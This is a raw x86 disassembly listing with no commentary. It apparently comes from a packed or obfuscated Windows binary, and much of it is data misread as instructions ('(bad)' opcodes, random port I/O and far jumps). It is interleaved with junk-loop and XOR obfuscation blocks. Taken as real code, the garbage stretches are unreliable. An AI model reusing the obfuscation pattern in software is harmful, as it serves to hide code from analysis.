  40b7f5:	jae    0x40b7fe
  40b7f7:	dec    edi
  40b7f8:	fs dec ebx
  40b7fa:	push   ss
  40b7fb:	hlt    
  40b7fc:	cmp    al,0x13
  40b7fe:	ror    BYTE PTR [ecx-0x29410deb],1
  40b804:	pop    ds
  40b805:	in     al,dx
  40b806:	mov    esp,DWORD PTR [esi+ebx*1]
  40b809:	repz and esp,ecx
  40b80c:	jno    0x40b7a2
  40b80e:	sbb    cl,BYTE PTR [ebx+0x4092bfe2]
  40b814:	retf   
  40b815:	mov    ebx,0xe83bf9cf
  40b81a:	sar    BYTE PTR [edx],1
  40b81c:	out    dx,al
  40b81d:	jp     0x40b88d
  40b81f:	mov    bl,ch
  40b821:	adc    eax,DWORD PTR [edx+0x1c]
  40b824:	or     DWORD PTR cs:[eax+0x4a847f4d],ecx
  40b82b:	mov    esp,0x2a567e8b
  40b830:	xchg   edx,eax
  40b831:	mov    ebp,0x78a356c5
  40b836:	lods   eax,DWORD PTR ds:[esi]
  40b837:	inc    esi
  40b838:	mov    eax,0x90ad84f4
  40b83d:	jmp    FWORD PTR [edi+0x771ad7be]
  40b843:	clc    
  40b844:	xchg   esi,eax
  40b845:	fbld   TBYTE PTR [eax-0x60c644a5]
  40b84b:	push   edi
  40b84c:	test   eax,0xaafcd586
  40b851:	sti    
  40b852:	jbe    0x40b7ea
  40b854:	pop    es
  40b855:	jecxz  0x40b831
  40b857:	repz icebp 
  40b859:	in     al,0xfb
  40b85b:	arpl   WORD PTR [ebx+0x2f],si
  40b85e:	cld    
  40b85f:	xor    al,0x77
  40b861:	mov    esp,0xee5793eb
  40b866:	outs   dx,DWORD PTR ds:[esi]
  40b867:	nop
  40b868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b869:	fnstcw WORD PTR [ebx-0x756c535f]
  40b86f:	test   eax,0x625182b9
  40b874:	retf   0xdeca
  40b877:	push   edi
  40b878:	rol    BYTE PTR [ecx+edx*4-0x2f6dff17],1
  40b87f:	sub    ecx,esi
  40b881:	ret    
  40b882:	rol    DWORD PTR [esi-0x40],cl
  40b885:	inc    esi
  40b886:	sbb    ah,BYTE PTR [eax-0x1bbcf25a]
  40b88c:	xor    eax,0x6bb51b96
  40b891:	aad    0xba
  40b893:	out    dx,eax
  40b894:	int    0x44
  40b896:	lods   eax,DWORD PTR ds:[esi]
  40b897:	loop   0x40b8e6
  40b899:	sbb    BYTE PTR [ecx-0xc],bh
  40b89c:	adc    al,0xd8
  40b89e:	push   ebx
  40b89f:	push   0x16
  40b8a1:	int3   
  40b8a2:	lods   al,BYTE PTR ds:[esi]
  40b8a3:	inc    edi
  40b8a4:	imul   edi,DWORD PTR [esi-0x3fda7369],0x30
  40b8ab:	xor    eax,0xeb27bb8e
  40b8b0:	inc    esp
  40b8b1:	fcmovu st,st(4)
  40b8b3:	adc    DWORD PTR [ebx+0x79],edx
  40b8b6:	dec    edx
  40b8b7:	push   es
  40b8b8:	xchg   ebp,eax
  40b8b9:	sub    edx,edi
  40b8bb:	push   ss
  40b8bc:	js     0x40b8fe
  40b8be:	inc    esp
  40b8bf:	out    dx,eax
  40b8c0:	push   es
  40b8c1:	ins    BYTE PTR es:[edi],dx
  40b8c2:	loope  0x40b910
  40b8c4:	int3   
  40b8c5:	(bad)  
  40b8c6:	(bad)  
  40b8c7:	pop    edi
  40b8c8:	inc    esp
  40b8c9:	xor    al,0x8b
  40b8cb:	shl    ebp,cl
  40b8cd:	pop    eax
  40b8ce:	fs cwde 
  40b8d0:	adc    dh,BYTE PTR [edx]
  40b8d2:	sub    eax,0x3deb6f81
  40b8d7:	push   ebp
  40b8d8:	cdq    
  40b8d9:	cmp    dl,BYTE PTR [edx+0x2bd824f4]
  40b8df:	in     al,dx
  40b8e0:	in     eax,dx
  40b8e1:	fwait
  40b8e2:	cli    
  40b8e3:	aaa    
  40b8e4:	call   0x88f25559
  40b8e9:	stc    
  40b8ea:	mov    ds:0x633681c0,eax
  40b8ef:	stos   DWORD PTR es:[edi],eax
  40b8f0:	jb     0x40b942
  40b8f2:	xchg   esi,eax
  40b8f3:	scas   al,BYTE PTR es:[edi]
  40b8f4:	popf   
  40b8f5:	int    0xdb
  40b8f7:	dec    ebx
  40b8f8:	scas   al,BYTE PTR es:[edi]
  40b8f9:	mov    al,0x89
  40b8fb:	jne    0x40b8e9
  40b8fd:	sbb    ecx,DWORD PTR ds:0x430546
  40b903:	mov    DWORD PTR [ebp-0x8],esi
  40b906:	xor    ecx,DWORD PTR ds:0x430496
  40b90c:	mov    ecx,DWORD PTR [ebp-0x18]
  40b90f:	neg    DWORD PTR ds:0x43049e
  40b915:	xor    ecx,eax
  40b917:	sbb    DWORD PTR ds:0x4304a6,0x1292
  40b921:	xor    edi,edi
  40b923:	add    ecx,ebx
  40b925:	mov    DWORD PTR [ebp-0x20],ecx
  40b928:	mov    DWORD PTR ds:0x42ee28,edi
  40b92e:	mov    eax,DWORD PTR [ebp-0x20]
  40b931:	je     0x40c70d
  40b937:	xor    DWORD PTR ds:0x42ee2c,edi
  40b93d:	mov    eax,DWORD PTR [ebp-0x4]
  40b940:	xor    eax,0x7510856
  40b945:	xor    DWORD PTR ds:0x42ee20,0x27f1
  40b94f:	jmp    0x40baad
  40b954:	mov    edx,ds
  40b956:	inc    edi
  40b957:	aam    0x59
  40b959:	push   ebp
  40b95a:	mov    ebp,0x1f44e87a
  40b95f:	adc    BYTE PTR ds:0x3e85a4da,0xf8
  40b966:	jle    0x40b9e6
  40b968:	aas    
  40b969:	jg     0x40b9e9
  40b96b:	jle    0x40b8f7
  40b96d:	adc    eax,esi
  40b96f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b970:	(bad)  
  40b971:	jne    0x40b972
  40b973:	mov    dh,0xbb
  40b975:	fistp  WORD PTR [edx+ebx*8+0x62c29072]
  40b97c:	sbb    edx,DWORD PTR [edx]
  40b97e:	cmp    eax,0x21b3cbc4
  40b983:	and    eax,0x7a65d7f3
  40b988:	mov    DWORD PTR [edi+eax*4+0x1e97eb8],ecx
  40b98f:	iret   
  40b990:	pop    ebx
  40b991:	xchg   edx,eax
  40b992:	inc    ebp
  40b993:	loop   0x40b959
  40b995:	xor    DWORD PTR [ecx+0x1],ebx
  40b998:	scas   al,BYTE PTR es:[edi]
  40b999:	jp     0x40b9bf
  40b99b:	push   esp
  40b99c:	inc    esp
  40b99d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b99e:	sbb    ecx,DWORD PTR [esi+0x1a87436f]
  40b9a4:	inc    esi
  40b9a5:	cmp    al,0x55
  40b9a7:	and    DWORD PTR [ebx-0x33],edx
  40b9aa:	sub    eax,0xa90d79b2
  40b9af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9b0:	scas   eax,DWORD PTR es:[edi]
  40b9b1:	pop    esp
  40b9b2:	ret    0x4d02
  40b9b5:	push   ebp
  40b9b6:	pop    es
  40b9b7:	pushf  
  40b9b8:	call   0x4c1c3805
  40b9bd:	pop    edi
  40b9be:	fxch   st(0)
  40b9c0:	pop    ebx
  40b9c1:	out    dx,al
  40b9c2:	ror    dh,0x19
  40b9c5:	sub    dh,0xa1
  40b9c8:	js     0x40b990
  40b9ca:	daa    
  40b9cb:	out    0xe1,al
  40b9cd:	fnstenv [ebp+ebx*8-0x21714e41]
  40b9d4:	xor    esp,DWORD PTR [eax]
  40b9d6:	pop    ecx
  40b9d7:	mov    dh,0xd4
  40b9d9:	lahf   
  40b9da:	or     eax,0x6b27a1f9
  40b9df:	dec    edx
  40b9e0:	fs pop ebx
  40b9e2:	sbb    eax,0xd5682c31
  40b9e7:	xchg   BYTE PTR [ecx-0x5cb889ea],bl
  40b9ed:	adc    esi,DWORD PTR [ecx]
  40b9ef:	xor    edi,esi
  40b9f1:	pop    ecx
  40b9f2:	cwde   
  40b9f3:	xor    cl,BYTE PTR [ecx]
  40b9f5:	cmp    BYTE PTR [edx+0x74ce22a0],bl
  40b9fb:	pushf  
  40b9fc:	and    eax,0xa47fb3f1
  40ba01:	ss xor al,0xe
  40ba04:	inc    eax
  40ba05:	cli    
  40ba06:	mov    al,0xe7
  40ba08:	das    
  40ba09:	add    DWORD PTR [edi],edx
  40ba0b:	out    dx,eax
  40ba0c:	shl    edx,1
  40ba0e:	cld    
  40ba0f:	xor    ch,BYTE PTR [esi*2+0x3c50fc00]
  40ba16:	js     0x40ba59
  40ba18:	das    
  40ba19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba1a:	outs   dx,BYTE PTR ds:[esi]
  40ba1b:	fwait
  40ba1c:	outs   dx,DWORD PTR ds:[esi]
  40ba1d:	fcomp  QWORD PTR [esi-0x69]
  40ba20:	mov    dl,0x23
  40ba22:	jae    0x40ba02
  40ba24:	pop    edi
  40ba25:	ficom  WORD PTR [esi]
  40ba27:	ja     0x40ba36
  40ba29:	(bad)  
  40ba2a:	pop    esp
  40ba2b:	cmp    dl,BYTE PTR [esi-0x31cf97ff]
  40ba31:	fxch   st(6)
  40ba33:	push   ss
  40ba34:	pop    ds
  40ba35:	js     0x40baad
  40ba37:	sub    al,0x7
  40ba39:	leave  
  40ba3a:	dec    esp
  40ba3b:	xor    BYTE PTR [ebp+0x6f],al
  40ba3e:	outs   dx,DWORD PTR ds:[esi]
  40ba3f:	sbb    ebp,DWORD PTR [esi+0x5e]
  40ba42:	add    eax,0xd11e6566
  40ba47:	jno    0x40ba37
  40ba49:	popf   
  40ba4a:	jns    0x40b9eb
  40ba4c:	call   0xbe18dbcb
  40ba51:	stos   DWORD PTR es:[edi],eax
  40ba52:	rol    BYTE PTR [edi-0x1d504590],1
  40ba58:	adc    BYTE PTR [ebx],al
  40ba5a:	inc    eax
  40ba5b:	lea    edx,[edi-0x75b065d]
  40ba61:	xchg   esi,eax
  40ba62:	popf   
  40ba63:	sub    DWORD PTR fs:[ecx+0x4c],ecx
  40ba67:	sbb    eax,0xf134d444
  40ba6c:	arpl   WORD PTR [ebp-0x7d9abf90],ax
  40ba72:	or     edx,DWORD PTR [esi-0x2]
  40ba75:	into   
  40ba76:	mov    eax,ds:0x522f1308
  40ba7b:	(bad)  
  40ba7d:	add    BYTE PTR [edi],dh
  40ba7f:	fadd   st(2),st
  40ba81:	sub    BYTE PTR [edi],bl
  40ba83:	imul   edi,esi,0xdaaa81dc
  40ba89:	in     eax,dx
  40ba8a:	cld    
  40ba8b:	mov    cl,0xe8
  40ba8d:	stos   DWORD PTR es:[edi],eax
  40ba8e:	imul   esi,DWORD PTR [esi+0x3],0xde088470
  40ba95:	repnz leave 
  40ba97:	sbb    dh,BYTE PTR [esi-0x60c84385]
  40ba9d:	pop    eax
  40ba9e:	adc    DWORD PTR [edi+0x7846671b],esi
  40baa4:	mov    eax,0x8f0eb77b
  40baa9:	sti    
  40baaa:	xor    al,BYTE PTR [ebx]
  40baac:	ins    BYTE PTR es:[edi],dx
  40baad:	add    eax,ebx
  40baaf:	mov    DWORD PTR ds:0x42ee20,0x3d16
  40bab9:	cmp    edi,eax
  40babb:	mov    DWORD PTR ds:0x430496,0x64f1
  40bac5:	jne    0x40c296
  40bacb:	or     DWORD PTR ds:0x42ee28,0x42ee14
  40bad5:	push   DWORD PTR [ebp+0x8]
  40bad8:	call   0x40a1ba
  40badd:	mov    DWORD PTR [ebp-0x20],eax
  40bae0:	mov    eax,DWORD PTR [ebp-0x4]
  40bae3:	mov    ecx,DWORD PTR [ebp-0x20]
  40bae6:	and    DWORD PTR ds:0x42ee1c,0x0
  40baf0:	mov    esi,DWORD PTR ds:0x42ee1c
  40baf6:	inc    esi
  40baf7:	mov    DWORD PTR ds:0x42ee1c,esi
  40bafd:	cmp    DWORD PTR ds:0x42ee1c,0x22
  40bb04:	jne    0x40bb1b
  40bb0a:	push   DWORD PTR [ebp-0x1c]
  40bb0d:	push   DWORD PTR [ebp-0x24]
  40bb10:	push   0x6795
  40bb15:	call   DWORD PTR ds:0x42ebd4
  40bb1b:	cmp    DWORD PTR ds:0x42ee1c,0x1d
  40bb22:	jb     0x40baf0
  40bb28:	mov    esi,DWORD PTR ds:0x430556
  40bb2e:	xor    DWORD PTR ds:0x4304b6,esi
  40bb34:	mov    esi,0x7510856
  40bb39:	add    DWORD PTR ds:0x4304b2,0x43049a
  40bb43:	xor    eax,esi
  40bb45:	jmp    0x40bca3
  40bb4a:	jns    0x40bb9f
  40bb4c:	mov    ah,0x6a
  40bb4e:	pop    esp
  40bb4f:	ins    DWORD PTR es:[edi],dx
  40bb50:	jns    0x40bbb7
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	iret   
  40bb54:	loopne 0x40bbad
  40bb56:	imul   eax,DWORD PTR [ebp-0x600c63b],0x7f3f7e7e
  40bb60:	jle    0x40bbe0
  40bb62:	test   al,0x4d
  40bb64:	(bad)  
  40bb65:	xchg   esp,eax
  40bb66:	pop    esp
  40bb67:	adc    bh,bl
  40bb69:	or     al,0x75
  40bb6b:	lahf   
  40bb6c:	pop    ebp
  40bb6d:	mov    esi,0xdafac56f
  40bb72:	shr    BYTE PTR [eax],0x73
  40bb75:	sub    bh,dh
  40bb77:	dec    ebx
  40bb78:	(bad)  
  40bb79:	in     al,dx
  40bb7a:	jl     0x40bb8a
  40bb7c:	jmp    0xa2130550
  40bb81:	int    0x20
  40bb83:	or     al,0x22
  40bb85:	fistp  QWORD PTR [edi]
  40bb87:	adc    eax,0x19d282b1
  40bb8c:	or     ah,0xc9
  40bb8f:	or     al,0x59
  40bb91:	lods   eax,DWORD PTR ds:[esi]
  40bb92:	mov    bl,0x3b
  40bb94:	or     BYTE PTR [edi+0x1e0cef1a],bl
  40bb9a:	cmp    ecx,DWORD PTR [esi-0x1197ee4a]
  40bba0:	stos   DWORD PTR es:[edi],eax
  40bba1:	mov    ch,0x9e
  40bba3:	jecxz  0x40bbc1
  40bba5:	mov    esi,DWORD PTR [ecx-0x32]
  40bba8:	bound  ecx,QWORD PTR [ebx+0x10500835]
  40bbae:	mov    edi,0x39835edf
  40bbb3:	(bad)  [edx-0x36]
  40bbb6:	test   cl,al
  40bbb8:	sub    ebp,DWORD PTR [ebp+0x33]
  40bbbb:	sub    edx,edx
  40bbbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbbe:	pop    eax
  40bbbf:	dec    esp
  40bbc0:	popf   
  40bbc1:	rcl    BYTE PTR [ecx+0x7a],cl
  40bbc4:	xchg   eax,edi
  40bbc6:	cmp    esp,esp
  40bbc8:	std    
  40bbc9:	sub    BYTE PTR [edi+0x28],ah
  40bbcc:	push   cs
  40bbcd:	fld    DWORD PTR [eax]
  40bbcf:	out    0xd1,eax
  40bbd1:	adc    al,0x37
  40bbd3:	pop    esi
  40bbd4:	mov    eax,ds:0x597cd689
  40bbd9:	inc    eax
  40bbda:	jp     0x40bc51
  40bbdc:	mov    fs:0xf90567a6,al
  40bbe2:	push   esi
  40bbe3:	arpl   bp,cx
  40bbe5:	mov    dl,ah
  40bbe7:	jne    0x40bb9a
  40bbe9:	mov    edi,0x73d58ed2
  40bbee:	test   DWORD PTR [ebx+0x70],ebx
  40bbf1:	and    al,0x38
  40bbf3:	fwait
  40bbf4:	clc    
  40bbf5:	std    
  40bbf6:	in     eax,dx
  40bbf7:	aas    
  40bbf8:	fcom   QWORD PTR ds:0xbde230df
  40bbfe:	cmp    BYTE PTR [ebp-0x3e],dl
  40bc01:	push   DWORD PTR [eax+0x4c]
  40bc04:	mov    dl,0x2b
  40bc06:	mov    al,0x21
  40bc08:	icebp  
  40bc09:	cli    
  40bc0a:	xor    eax,0x382f0208
  40bc0f:	adc    eax,edi
  40bc11:	lea    eax,[ebx-0x77d3d19a]
  40bc17:	add    esi,DWORD PTR [ecx-0x43ab8564]
  40bc1d:	pop    esp
  40bc1e:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc20:	jnp    0x40bc35
  40bc22:	in     al,dx
  40bc23:	xchg   edi,eax
  40bc24:	mov    cs,WORD PTR [edx]
  40bc26:	icebp  
  40bc27:	dec    ebx
  40bc28:	mov    dh,0x18
  40bc2a:	in     eax,0x37
  40bc2c:	out    0xd3,al
  40bc2e:	xchg   BYTE PTR [edi+0x79],cl
  40bc31:	fidiv  WORD PTR [ecx]
  40bc33:	mov    esi,0xc118e3d8
  40bc38:	inc    esi
  40bc39:	sub    al,0x2a
  40bc3b:	popa   
  40bc3c:	stc    
  40bc3d:	mov    bh,0xce
  40bc3f:	(bad)  
  40bc40:	push   ebp
  40bc41:	xchg   edx,eax
  40bc42:	inc    ebx
  40bc43:	xchg   esi,eax
  40bc44:	maskmovq mm5,mm5
  40bc47:	jmp    0x5c6a:0xd6a34766
  40bc4e:	jg     0x40bc74
  40bc50:	bound  ebp,QWORD PTR [ebp+0x5f]
  40bc53:	in     al,0xe3
  40bc55:	jmp    0x40bbfa
  40bc57:	inc    BYTE PTR [edi-0x56]
  40bc5a:	mov    ss:0xe981a15f,eax
  40bc60:	mov    ah,0x63
  40bc62:	repz mov ah,0xd6
  40bc65:	retf   0x2c90
  40bc68:	cmp    al,0x2b
  40bc6a:	add    eax,0xf7a25ea9
  40bc6f:	dec    BYTE PTR [edi]
  40bc71:	and    DWORD PTR ss:[esi-0x16],edx
  40bc75:	mov    eax,ds:0x4edb002
  40bc7a:	push   0x41
  40bc7c:	and    BYTE PTR [ebx+0x4e],dl
  40bc7f:	not    DWORD PTR [edx+ebp*1-0x78]
  40bc83:	mov    DWORD PTR ds:0x3498b6c7,esi
  40bc89:	addr16 pop esp
  40bc8b:	dec    eax
  40bc8c:	leave  
  40bc8d:	xchg   esp,eax
  40bc8e:	outs   dx,DWORD PTR ds:[esi]
  40bc8f:	push   ebx
  40bc90:	pop    edx
  40bc91:	sub    esi,DWORD PTR [eax+0x36]
  40bc94:	xchg   ecx,eax
  40bc95:	mov    bl,0x2d
  40bc97:	outs   dx,DWORD PTR ds:[esi]
  40bc98:	jl     0x40bcd5
  40bc9a:	inc    BYTE PTR [edx+0x5d]
  40bc9d:	(bad)  
  40bc9e:	mov    esi,0xa0d3736f
  40bca3:	add    eax,ebx
  40bca5:	cmp    ecx,eax
  40bca7:	mov    DWORD PTR ds:0x430552,0x373b
  40bcb1:	je     0x40c6f1
  40bcb7:	sbb    DWORD PTR ds:0x43054e,0x42ee30
  40bcc1:	push   DWORD PTR [ebp-0x20]
  40bcc4:	and    DWORD PTR ds:0x4304be,0x430546
  40bcce:	push   DWORD PTR [ebp+0x8]
  40bcd1:	call   0x40a7ab
  40bcd6:	and    DWORD PTR ds:0x4304c2,0x0
  40bce0:	jmp    0x40bcf2
  40bce5:	mov    ecx,DWORD PTR ds:0x4304c2
  40bceb:	inc    ecx
  40bcec:	mov    DWORD PTR ds:0x4304c2,ecx
  40bcf2:	cmp    DWORD PTR ds:0x4304c2,0x1e
  40bcf9:	jae    0x40bd40
  40bcff:	cmp    DWORD PTR ds:0x4304c2,0xd
  40bd06:	jne    0x40bd1f
  40bd0c:	push   DWORD PTR [ebp-0xc]
  40bd0f:	push   0x4304a2
  40bd14:	push   0x2a1f
  40bd19:	call   DWORD PTR ds:0x42ea2c
  40bd1f:	cmp    DWORD PTR ds:0x4304c2,0xc
  40bd26:	jne    0x40bd3b
  40bd2c:	xor    ecx,ecx
  40bd2e:	add    ecx,DWORD PTR ds:0x4304c2
  40bd34:	inc    ecx
  40bd35:	mov    DWORD PTR ds:0x4304c2,ecx
  40bd3b:	jmp    0x40bce5
  40bd40:	mov    DWORD PTR [ebp-0x14],eax
  40bd43:	xor    DWORD PTR ds:0x42e772,0x3e11
  40bd4d:	mov    eax,DWORD PTR [ebp-0x4]
  40bd50:	add    ecx,DWORD PTR ds:0x430496
  40bd56:	mov    ecx,DWORD PTR [ebp-0x14]
  40bd59:	xor    eax,esi
  40bd5b:	or     DWORD PTR ds:0x43055a,0x430552
  40bd65:	add    eax,ebx
  40bd67:	cmp    ecx,eax
  40bd69:	mov    DWORD PTR ds:0x42ee10,0x41d
  40bd73:	je     0x40c6f1
  40bd79:	add    eax,ecx
  40bd7b:	mov    eax,DWORD PTR [ebp-0x14]
  40bd7e:	mov    DWORD PTR ds:0x4304b2,0x19
  40bd88:	cmp    DWORD PTR ds:0x4304b2,0x0
  40bd8f:	je     0x40bdbf
  40bd95:	cmp    DWORD PTR ds:0x4304b2,0x1b
  40bd9c:	jne    0x40bdad
  40bda2:	push   0x2712
  40bda7:	call   DWORD PTR ds:0x42ea30
  40bdad:	mov    ecx,DWORD PTR ds:0x4304b2
  40bdb3:	dec    ecx
  40bdb4:	mov    DWORD PTR ds:0x4304b2,ecx
  40bdba:	jmp    0x40bd88
  40bdbf:	mov    eax,DWORD PTR [eax+0x18]
  40bdc2:	sub    ecx,DWORD PTR ds:0x43055a
  40bdc8:	mov    DWORD PTR [ebp-0x20],eax
  40bdcb:	jmp    0x40bf29
  40bdd0:	fld    QWORD PTR [ebx-0x66]
  40bdd3:	xor    bl,BYTE PTR [ebx+ecx*8+0x503d5d5d]
  40bdda:	cmp    al,0x3b
  40bddc:	dec    esi
  40bddd:	dec    ebp
  40bdde:	das    
  40bddf:	shl    BYTE PTR [eax+0x3f7e7efa],cl
  40bde5:	jg     0x40be65
  40bde7:	jle    0x40bdde
  40bde9:	aaa    
  40bdea:	add    ebx,edi
  40bdec:	out    dx,eax
  40bded:	mov    edx,0xbdb6033e
  40bdf2:	ret    0xec28
  40bdf5:	sbb    al,0x32
  40bdf7:	pop    eax
  40bdf8:	pushf  
  40bdf9:	call   0x4c06:0xa7934c2
  40be00:	je     0x40bda7
  40be02:	mov    ah,0x85
  40be04:	or     DWORD PTR [eax-0x62],ecx
  40be07:	pop    ss
  40be08:	or     BYTE PTR [edi-0x19],ch
  40be0b:	add    eax,0xc75f873c
  40be10:	in     eax,0x3c
  40be12:	rcr    BYTE PTR [edi-0x121a958a],1
  40be18:	sbb    al,0x95
  40be1a:	push   ecx
  40be1b:	adc    al,0x40
  40be1d:	ret    
  40be1e:	sub    DWORD PTR es:[esi+0x7],edx
  40be22:	in     eax,dx
  40be23:	loopne 0x40be97
  40be25:	jp     0x40bdfe
  40be27:	retf   
  40be28:	pop    edx
  40be29:	jp     0x40be19
  40be2b:	inc    edx
  40be2c:	out    dx,al
  40be2d:	shl    ah,cl
  40be2f:	pusha  
  40be30:	dec    edx
  40be31:	cmp    al,0x1b
  40be33:	mov    ds:0x83e9606c,eax
  40be38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be39:	es fs loop 0x40beac
  40be3d:	punpckhwd mm4,QWORD PTR [esi]
  40be40:	xchg   esp,eax
  40be41:	mov    DWORD PTR [eax+0x2410e938],ecx
  40be47:	add    al,0x46
  40be49:	mov    ch,0xec
  40be4b:	add    dh,BYTE PTR [edi]
  40be4d:	fs cs (bad) 
  40be50:	sar    BYTE PTR [edi],1
  40be52:	std    
  40be53:	js     0x40beb4
  40be55:	int    0x1b
  40be57:	out    dx,eax
  40be58:	fs in  eax,0x4a
  40be5b:	(bad)  
  40be5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be5d:	jecxz  0x40be9b
  40be5f:	jp     0x40bde7
  40be61:	ror    DWORD PTR [eax+0x72cf0c37],0x4d
  40be68:	jp     0x40be13
  40be6a:	mov    edx,0xfdbcf4df
  40be6f:	lods   eax,DWORD PTR ds:[esi]
  40be70:	mov    dl,0x86
  40be72:	pop    ebx
  40be73:	mov    WORD PTR [ebp+0x7b],ss
  40be76:	loop   0x40be5f
  40be78:	das    
  40be79:	dec    esp
  40be7a:	rol    BYTE PTR [eax-0x6105e25e],0xdd
  40be81:	xchg   ebx,eax
  40be82:	(bad)  [ecx-0xa]
  40be85:	push   ebp
  40be86:	pop    edx
  40be87:	adc    ah,BYTE PTR [eax+0x518bb861]
  40be8d:	imul   eax,DWORD PTR [ecx-0x7c],0x8eaacfdc
  40be94:	stos   BYTE PTR es:[edi],al
  40be95:	sbb    DWORD PTR [edi+eax*8],ecx
  40be98:	mov    edi,0x731043e7
  40be9d:	cmp    DWORD PTR [ecx+esi*4-0x30],ebp
  40bea1:	fcomip st,st(7)
  40bea3:	cs push ds
  40bea5:	leave  
  40bea6:	and    eax,0x9a1782bd
  40beab:	ret    0x36b6
  40beae:	dec    eax
  40beaf:	lea    ebx,ds:0xc3de5288
  40beb5:	leave  
  40beb6:	push   es
  40beb7:	fistp  DWORD PTR [eax+0x2bbcd79c]
  40bebd:	mov    bl,0xc9
  40bebf:	push   eax
  40bec0:	xchg   ebx,eax
  40bec1:	dec    eax
  40bec2:	and    ebx,DWORD PTR [ebx+0x1b407e3]
  40bec8:	push   0x8586e8e5
  40becd:	out    0x6c,eax
  40becf:	mov    ?,WORD PTR [edx+0x2fca3bbf]
  40bed5:	popf   
  40bed6:	add    eax,0x2124837c
  40bedb:	hlt    
  40bedc:	xor    BYTE PTR [edx-0x5f],0x5d
  40bee0:	inc    ebp
  40bee1:	fdivr  DWORD PTR [esi-0x5b]
  40bee4:	enter  0x2dba,0x94
  40bee8:	imul   ebp,DWORD PTR [ebp+0x1a3c1fc7],0x23898486
  40bef2:	ds sbb al,0x3
  40bef5:	adc    dh,BYTE PTR [edi+0x33]
  40bef8:	out    dx,al
  40bef9:	les    edi,FWORD PTR [eax]
  40befb:	fsubr  DWORD PTR [eax+0x12e54bf5]
  40bf01:	jp     0x40beaa
  40bf03:	mov    ebp,es
  40bf05:	adc    eax,0x2dece3fb
  40bf0a:	js     0x40bf13
  40bf0c:	dec    BYTE PTR [esi-0x1cb4c453]
  40bf12:	push   0x25
  40bf14:	jmp    0x40bec0
  40bf16:	jne    0x40bf93
  40bf18:	mov    WORD PTR [eax+0xc],es
  40bf1b:	jns    0x40bf16
  40bf1d:	and    eax,0xdf5689a0
  40bf22:	pop    edi
  40bf23:	daa    
  40bf24:	test   al,0xfa
  40bf26:	adc    DWORD PTR [edi],ebx
  40bf28:	ror    BYTE PTR [ebx+0x4d8bec45],cl
  40bf2e:	or     BYTE PTR [ecx+0x4304a61d],al
  40bf34:	add    BYTE PTR [esi+ecx*1+0x59e90000],dl
  40bf3b:	add    DWORD PTR [eax],eax
  40bf3d:	add    ah,bl
  40bf3f:	(bad)  
  40bf40:	lods   eax,DWORD PTR ds:[esi]
  40bf41:	dec    edi
  40bf42:	ins    DWORD PTR es:[edi],dx
  40bf43:	jge    0x40bf41
  40bf45:	popf   
  40bf46:	mov    dh,0x46
  40bf48:	(bad)  
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	fs sti 
  40bf4c:	in     eax,0x50
  40bf4e:	jno    0x40bf4c
  40bf50:	jle    0x40bfd0
  40bf52:	aas    
  40bf53:	jg     0x40bfd3
  40bf55:	jle    0x40bf64
  40bf57:	pop    edx
  40bf58:	repnz pushf 
  40bf5a:	mov    eax,0xafb56c1f
  40bf5f:	out    dx,al
  40bf60:	mov    WORD PTR ds:0x3d7ac42d,?
  40bf66:	xchg   BYTE PTR [edx-0x746c511a],al
  40bf6c:	mov    cl,0x74
  40bf6e:	inc    ecx
  40bf6f:	or     bl,BYTE PTR [ebp+0x2526214a]
  40bf75:	ror    DWORD PTR ds:0x1187acd2,1
  40bf7b:	int3   
  40bf7c:	push   edx
  40bf7d:	scas   eax,DWORD PTR es:[edi]
  40bf7e:	xor    bl,BYTE PTR [ebx-0x65dacb69]
  40bf84:	xlat   BYTE PTR ds:[ebx]
  40bf85:	repnz sbb dl,BYTE PTR [edi-0x592f33a0]
  40bf8c:	jb     0x40bfdf
  40bf8e:	push   eax
  40bf8f:	cmp    al,0x18
  40bf91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf92:	xchg   BYTE PTR [ecx+0x39],al
  40bf95:	mov    ebx,0x15506379
  40bf9a:	lock pop eax
  40bf9c:	retf   
  40bf9d:	sub    bl,BYTE PTR [edi*2-0x48446fb]
  40bfa4:	fadd   QWORD PTR [edi]
  40bfa6:	(bad)  
  40bfa7:	outs   dx,BYTE PTR ds:[esi]
  40bfa8:	push   cs
  40bfa9:	or     dl,BYTE PTR [ebp+0x45d7c2dc]
  40bfaf:	and    BYTE PTR [ecx-0x7a],0x3
  40bfb3:	sbb    al,dh
  40bfb5:	inc    esp
  40bfb6:	in     al,dx
  40bfb7:	leave  
  40bfb8:	jno    0x40bf7f
  40bfba:	mov    gs,WORD PTR [edx+edi*2]
  40bfbd:	loop   0x40bf9e
  40bfbf:	mov    ebp,ss
  40bfc1:	jbe    0x40bffd
  40bfc3:	ror    BYTE PTR [edi-0xa08e6e4],cl
  40bfc9:	or     BYTE PTR [ebx],0x1d
  40bfcc:	(bad)  
  40bfcd:	xchg   ebx,eax
  40bfce:	int3   
  40bfcf:	add    DWORD PTR [ebp+ebp*1-0x73af2973],ebx
  40bfd6:	jno    0x40c02c
  40bfd8:	popf   
  40bfd9:	cli    
  40bfda:	or     al,0x14
  40bfdc:	nop    DWORD PTR [edx-0x7c118e7]
  40bfe3:	es ret 0xfbfd
  40bfe7:	popa   
  40bfe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfe9:	retf   0xcfa8
  40bfec:	adc    bh,0xdd
  40bfef:	mov    ch,0xfe
  40bff1:	pusha  
  40bff2:	push   ebp
  40bff3:	adc    eax,0x7ac161df
  40bff8:	pop    esp
  40bff9:	inc    eax
  40bffa:	and    al,0x68
  40bffc:	dec    ebp
  40bffd:	mov    ds:0xd47e593b,eax
  40c002:	retf   0x4e77
  40c005:	dec    ebp
  40c006:	inc    ecx
  40c007:	int3   
  40c008:	mov    bl,0x3b
  40c00a:	adc    BYTE PTR [esi-0x68d7eb0c],dl
  40c010:	xchg   BYTE PTR [esi],al
